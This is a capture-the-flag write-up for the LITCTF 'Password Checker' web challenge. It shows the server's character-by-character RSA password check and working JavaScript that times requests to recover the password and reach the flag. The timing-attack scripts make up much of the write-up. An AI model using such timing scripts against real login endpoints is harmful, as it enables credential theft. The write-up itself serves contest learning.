## Challenge

I have like so many things that I want to do, but I am not sure if I want others to see them yet D: I guess I will just hide all the super important stuff behind my super super fortified and secure [Password Checker](http://litctf.live:31776/)!

## Solution

### Analysis

This is an interesting one! Looking in `main.js`, we see our main and only target:
```js
var flag = (process.env.FLAG ?? "ctf{flag}");
// I like alphanumeric passwords
var password = (process.env.password ?? "password");

/* ... standard Express.js stuff */

app.get('/verify', (req, res) => {
	var pass = req.query.password;
	if(pass == undefined || typeof(pass) !== 'string' || !checkPassword(password,pass)) {
		res.writeHead(302, {'Location': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley'});
		res.end();
		return;
	}
	res.render("secret",{flag: flag});
});
```

Hm... to simple and standard to exploit here. We'll look at `checkPassword()` in `passwordChecker.js`:
```js
// I think this is how you're supposed to implement RSA?
// IDK this is a web challenge not a crypto challenge :clown:
// I just picked 2 random prime numbers as the tutorial said
// (Or is it 0_0)

/* ... blah blah some standard RSA code */

function checkPassword(password,pass) {
	var arr = pass.split(",");
	for(var i = 0;i < arr.length;++i) {
		arr[i] = parseInt(arr[i]);
	}

	if(arr.length != password.length) return false;
	for(var i = 0;i < arr.length;++i) {
		var currentChar = password.charCodeAt(i);
		var currentInput = decryptRSA(arr[i]);
		if(currentChar != currentInput) return false;
	}
	return true;
}
```
...well, that's interesting. As the top of the file hints, the RSA decryption is basic and standard, and we're given all public and private values so it's basically pointless.

But it's used weirdly... each _individual_ character is decrypted, one at a time, and the moment there's a mismatch, the function returns `false`. So it's seemingly even more pointless...

Except it seems there's really nowhere to exploit. `pass` must be a string, so we can't inject anything into this function. `NaN` won't break anything either.

But comparing strings character-by-character with an inefficient process that returns as soon as a mismatch is found? This sounds like a <u>timing attack</u>!

### Attack

For reference, how the password is encoded for transmission (`views/index.ejs`):
```js
function submitForm() {
    var pwd = $("#password").val();
    var arr = [];
    for(var i = 0;i < pwd.length;++i) {
        arr.push(encryptRSA(pwd.charCodeAt(i)));
    }
    window.location.href = "/verify?password=" + arr.join();
    return;
}
```
Since `checkPassword()` first checks lengths, we need to find the password length first before guessing characters:
```js
(async () => { // IIFE (to use await) not necessary on Chrome
    for (let i = 1; i <= 10; ++i) {
        const pwd = "a".repeat(i);
        const q = pwd.split("").map(c=>encryptRSA(c.charCodeAt(0))).join(); // arr.join()
        const t = performance.now(); // timing start
        await fetch(`http://litctf.live:31776/verify?password=${q}`, {
            "redirect": "manual", // to ignore the redirect
        });
        console.log(pwd, performance.now()-t); // timing end
        await new Promise(resolve => setTimeout(resolve, 2000)); // timeout to avoid rate limits
    }
})()
```
Rate limits were a bit annoying - they can show up as `429 Too Many Requests`, but they also randomly increase timings with no errors. However, looking at results, it's obvious whether rate limits affected it.

Oh, yeah. The first request is always much slower for some reason, but the password isn't gonna be one character, right???

But anyway, hooray! `aaaaaa` has a clear difference! And the rest are almost constant, no need to average trials. We move on:
```js
(async () => {
    for (let c of "AABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz") {
        const pwd = `${c}aaaaa`;
/* the same thing */
```
(The first letter is to avoid the slow first request.)

But yay! `Caaaaa` has a significant difference (~1024 vs ~200), and we move on, testing `C${c}aaaa` and so on. (It's only 6 characters total, so it's not worthy to automate, especially since random outliers rarely appear.)

4 more rounds later (with requests taking longer and longer), we get `CxIj6_`. The last character is tricky, because a success won't mean another character check; instead, we will get sent to the flag!
```js
await (async () => {
    for (let c of "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz") {
        const pwd = `CxIj6${c}`;
        const q = pwd.split("").map(c=>encryptRSA(c.charCodeAt(0))).join();
        try {
            const res = await fetch(`http://litctf.live:31776/verify?password=${q}`, {
                "redirect": "error", // so only the correct one doesn't error
            });
            return await res.text();
        } catch {}
        console.log(pwd, "failed");
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
})()
```
And for `CxIj6p`...

Yay!

## Flag

`LITCTF{uwu_st3ph4ni3_i5_s0_0rz_0rz_0TZ}`

## Notes

At first I averaged trials, but then it got painfully slow so I tried just one each and it worked. Also, for the last character, I originally just manually guessed until I got it right! (Lots of rickrolling there...)
